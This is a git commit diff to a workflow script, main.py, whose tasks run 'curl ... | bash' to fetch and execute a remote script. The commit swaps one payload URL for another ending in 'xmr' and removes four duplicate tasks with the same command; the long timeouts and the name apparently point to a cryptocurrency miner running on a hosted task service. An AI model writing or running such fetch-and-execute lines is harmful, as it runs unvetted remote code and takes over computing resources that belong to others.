82fca5dcf44217d12a1061e4d74c60e88a495e17
fadliamroziqyaa-hub <fadliamroziqyaa@gmail.com>
2026-04-01 03:03:58 -0700

    Update main.py

--- main.py
+++ main.py
@@ -14,60 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building2():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building3():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building4():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building5():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
+  os.system('curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/xmr | bash')
 
 if __name__ == "__main__":
   app.start()
